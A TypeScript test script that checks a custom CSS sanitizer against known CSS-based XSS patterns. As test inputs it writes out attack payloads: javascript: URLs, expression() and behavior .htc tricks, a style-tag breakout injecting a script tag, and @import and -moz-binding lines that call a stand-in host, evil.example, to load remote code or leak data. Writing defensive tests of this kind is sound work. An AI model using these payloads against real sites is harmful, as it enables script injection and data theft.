/**
 * Live test for Theme Track B1.4's Custom CSS sanitizer
 * (@/lib/themes/custom-css-sanitizer) against real, known CSS-based XSS
 * attack patterns — not just happy-path CSS. A security-sensitive utility
 * like this must be verified against actual attack payloads, not just
 * reviewed for logic.
 *
 * Usage: npx tsx scripts/test-custom-css-sanitizer.ts
 */

async function main() {
  const { sanitizeCustomCss, CustomCssValidationError, MAX_CUSTOM_CSS_LENGTH } = await import(
    '../src/lib/themes/custom-css-sanitizer'
  );

  let passed = 0;
  let total = 0;

  function check(label: string, condition: boolean, detail?: unknown) {
    total++;
    if (condition) {
      passed++;
      console.log(`PASS: ${label}`);
    } else {
      console.log(`FAIL: ${label}`, detail ?? '');
    }
  }

  // 1. javascript: URL in a property value.
  {
    const { css, removedCount } = sanitizeCustomCss("body { background: url(javascript:alert(1)); color: red; }");
    check('strips javascript: url() declaration', !css.includes('javascript:') && removedCount === 1, css);
    check('keeps the safe sibling declaration', css.includes('color: red'), css);
  }

  // 2. @import (remote CSS loading / data exfiltration via query string).
  {
    const { css, removedCount } = sanitizeCustomCss("@import url('https://evil.example/steal.css?x=1'); body { color: blue; }");
    check('strips @import entirely', !css.includes('@import') && removedCount === 1, css);
    check('keeps the safe rule after @import', css.includes('color: blue'), css);
  }

  // 3. -moz-binding (XBL binding XSS).
  {
    const { css, removedCount } = sanitizeCustomCss("* { -moz-binding: url('https://evil.example/xss.xml#xss'); }");
    check('strips -moz-binding declaration', !css.includes('-moz-binding') && removedCount === 1, css);
  }

  // 4. Old-IE expression().
  {
    const { css, removedCount } = sanitizeCustomCss("body { color: expression(alert('xss')); }");
    check('strips expression() declaration', !css.includes('expression') && removedCount === 1, css);
  }

  // 5. behavior: url(...) (old-IE .htc XSS).
  {
    const { css, removedCount } = sanitizeCustomCss("div { behavior: url(xss.htc); }");
    check('strips behavior declaration', !css.includes('behavior') && removedCount === 1, css);
  }

  // 6. Legitimate CSS passes through with real content intact.
  {
    const input = ".my-class { color: red; background: url('https://example.com/image.png'); font-family: Georgia, serif; }";
    const { css, removedCount } = sanitizeCustomCss(input);
    check('legitimate CSS survives with zero removals', removedCount === 0 && css.includes('color: red') && css.includes('Georgia'), css);
  }

  // 7. Allowed at-rules (@media) are preserved, including nested content.
  {
    const { css, removedCount } = sanitizeCustomCss('@media (max-width: 600px) { .foo { color: blue; } }');
    check('@media preserved with its nested rule', removedCount === 0 && css.includes('@media') && css.includes('color: blue'), css);
  }

  // 8. Style-tag breakout attempt.
  {
    let threw = false;
    let cssIfNoThrow = '';
    try {
      const result = sanitizeCustomCss('body { color: red; } </style><script>alert(1)</script><style>{}');
      cssIfNoThrow = result.css;
    } catch {
      threw = true;
    }
    // Either outcome is acceptable (reject entirely, or neutralize) as
    // long as the literal "</style" sequence never survives into stored
    // output.
    check('style-tag breakout neutralized either by rejection or stripping', threw || !cssIfNoThrow.toLowerCase().includes('</style'), cssIfNoThrow);
  }

  // 9. Garbage/malformed CSS is rejected outright, never "fixed".
  {
    let threw = false;
    try {
      sanitizeCustomCss('this is not real css {{{');
    } catch (error) {
      threw = error instanceof CustomCssValidationError;
    }
    check('malformed CSS throws CustomCssValidationError', threw);
  }

  // 10. Oversized input is rejected.
  {
    let threw = false;
    try {
      sanitizeCustomCss('a'.repeat(MAX_CUSTOM_CSS_LENGTH + 1));
    } catch (error) {
      threw = error instanceof CustomCssValidationError;
    }
    check('oversized CSS throws CustomCssValidationError', threw);
  }

  // 11. Comments are stripped (defense in depth, no real vector but cheap).
  {
    const { css, removedCount } = sanitizeCustomCss('/* a comment */ body { color: green; }');
    check('comments stripped', removedCount === 1 && !css.includes('/*') && css.includes('color: green'), css);
  }

  console.log(`\n${passed}/${total} checks passed.`);
  if (passed !== total) process.exit(1);
}

main().catch((error) => {
  console.error('\nTest failed:', error);
  process.exit(1);
});
